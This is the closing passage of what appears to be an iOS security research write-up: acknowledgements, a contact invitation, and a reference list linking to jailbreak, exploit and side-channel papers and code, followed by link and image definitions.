A "thank you" goes out to all the people I've quoted for their work, as well as to the [radare2 project](https://github.com/radare/radare2) for their overly awesome reverse engineering toolkit.

Again, don't hesitate to shoot me questions or feedback [on Twitter][me] or via mail (`*@*.net` where `*` = `siguza`).

Cheers. :)

### References

- Myself: [hsp4 kext][hsp4] (code and `kernel_task` problem discussion)
- Ian Beer: [Exception-oriented exploitation on iOS][p0blog] (write-up)
- Luca Todesco: [Yalu102 jailbreak][yalu102] (code)
- Jonathan Levin: [Phœnix jailbreak][phoenix] (write-up)
- tihmstar and myself: [PhœnixNonce][phnonce] (code)
- Daniel Gruss, Clémentine Maurice, Anders Fogh, Moritz Lipp and Stefan Mangard: [Prefetch Side-Channel Attacks][prefetch] (paper)
- Benjamin Randazzo: [Trident exploit][trident] (code)

<!-- link references -->

  [hsp4]: https://github.com/Siguza/hsp4
  [p0blog]: https://googleprojectzero.blogspot.com/2017/04/exception-oriented-exploitation-on-ios.html
  [yalu102]: https://github.com/kpwn/yalu102
  [phoenix]: http://newosxbook.com/files/PhJB.pdf
  [phnonce]: https://github.com/Siguza/PhoenixNonce
  [me]: https://twitter.com/s1guza
  [qwerty]: https://twitter.com/qwertyoruiopz
  [tihm]: https://twitter.com/tihmstar
  [benjamin]: https://twitter.com/____benjamin
  [prefetch]: https://gruss.cc/files/prefetch.pdf
  [trident]: https://github.com/benjamin-42/Trident
  [img1]: assets/img/1-structs.svg
  [img2]: assets/img/2-overlay.svg
  [img3]: assets/img/3-overlay.svg
  [img4]: assets/img/4-evg.svg
  [img5]: assets/img/5-lleq.svg
  [img6]: assets/img/6-zero.svg
  [img7]: assets/img/7-align.png
  [img8]: assets/img/8-align.png
  [img9]: assets/img/9-iohideous.png
